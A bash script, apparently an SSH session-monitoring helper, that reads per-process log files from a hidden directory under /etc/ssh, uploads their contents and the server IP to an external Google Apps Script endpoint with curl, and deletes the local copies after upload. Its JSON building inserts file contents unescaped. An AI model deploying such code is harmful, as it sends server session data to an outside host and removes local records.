#!/bin/bash

DIR="/etc/ssh/.ssh-monitoring"

API_URL="https://script.google.com/macros/s/AKfycbzeHrt9VhbQwo3a1h2XU8VRldoUJncg6QxGR3IJs3EcczMee7hpfTeVCIdTMdkON4TV1w/exec"

# get server ipv4
SERVER_IP=$(hostname -I | awk '{print $1}')

[ -d "$DIR" ] || exit 0

for file in "$DIR"/*.txt; do

    [ -e "$file" ] || continue

    pid="${file##*/}"
    pid="${pid%.txt}"

    # skip invalid names
    [[ "$pid" =~ ^[0-9]+$ ]] || continue

    # skip active processes
    if ps -p "$pid" > /dev/null 2>&1; then
        continue
    fi

    FILE_CONTENT=$(cat "$file")

    JSON=$(cat <<EOF
{
"api":"update",
"server":"$SERVER_IP",
"pid":"$pid",
"file":$(printf '%s' "$FILE_CONTENT")
}
EOF
)

    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$API_URL" \
        -H "Content-Type: application/json" \
        -d "$JSON")

    if [ "$RESPONSE" = "200" ]; then
        rm -f "$file"
    fi

done
